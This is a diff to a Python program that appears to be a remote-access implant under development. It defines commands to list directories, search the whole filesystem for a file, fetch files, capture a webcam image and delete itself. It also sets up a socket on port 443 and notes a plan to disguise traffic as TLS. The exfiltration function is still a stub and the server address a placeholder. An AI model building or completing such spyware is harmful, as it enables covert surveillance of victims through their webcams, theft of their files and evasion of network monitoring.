@@ -1,5 +1,5 @@
-import os
 import random
+import subprocess
 from socket import *
 
 import cv2
@@ -36,15 +36,12 @@ def ls(cp):
         path = "/"
     else:
         path = cp
-    fs = os.listdir(path)
-    exfil(fs)
+    process = subprocess.run(["ls", cp], capture_output=True)
+    exfil(process.stdout)
 
 def find(cp):
-    out = ""
-    for root, dirs, files in os.walk("/"):
-        if cp in files:
-            out.append(os.path.join(root,cp))
-            out+="\n"
+    fs = subprocess.Popen(["find", "/"], stdout=subprocess.PIPE)
+    out = subprocess.check_output(["grep", cp], stdin=fs.stdout)
     exfil(out)
 
 def get(cp):
@@ -60,10 +57,12 @@ def cam():
     exfil(img.read()[1])
 
 def sd():
-    os.remove(__file__)
+    subprocess.run(["rm", __file__])
 
 def exfil(info): # TODO
     print("exfil something")
+
+# FakeTLS code based on https://medium.com/@raykaryshyn/an-implementation-of-faketls-85b94f496d72
 
 ip = "1"
 port = 443
